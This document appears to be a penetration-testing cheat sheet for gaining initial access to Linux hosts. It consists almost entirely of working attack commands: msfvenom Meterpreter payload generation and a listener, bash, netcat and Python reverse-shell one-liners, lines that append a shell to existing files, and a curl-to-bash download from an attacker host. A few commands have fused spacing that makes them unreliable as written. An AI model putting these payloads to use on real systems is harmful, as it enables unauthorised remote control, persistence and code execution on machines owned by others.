### **Initial Access**

### **Meterpreter**

**Steps**

1. Craft your payload

```bash
# Alternatively, use msfvenom to create an ELF payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f elf -o shell.elf

# If the target machine allows Bash scripts to execute
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f bash -o payload.sh

# Useful if Python is available on the target
msfvenom -p python/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o payload.py

```

1. Start your listener

```bash
sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"

```

1. Deliver it to the user, remember that if it is a `.elf` it needs to be added the permission for execution and then execute

```bash
chmod +x ./shell.elf

./shell.elf

```

### **Reverse Shells**

### **Listener**

```bash
nc -nvlp [PORT]

```

### **Bash**

**Normal Request**

```bash
# Direct Bash reverse shell
/bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT>0>&1# Add the reverse shell to an existing file
echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> shell.sh
./shell.sh

```

**One-Liners**

```bash
# FIFO method with Netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc <TARGET_IP> <TARGET_PORT> >/tmp/f

# Using 'sh' for reverse shell
sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT>0>&1# Downloading a script
curl http://[ATTACKER_IP]/s.sh | bash

```

### **Netcat**

```bash
# Using -e
nc <TARGET_IP> <TARGET_PORT> -e /bin/sh
nc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash

# Without -e option
mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f2>&1; rm /tmp/f

# Add the reverse shell to an existing file
echo 'nc [lhost] [lport] -e /bin/bash' >> [file]

```

### **Python**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Alternative Python Reverse Shell Payload
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py

```
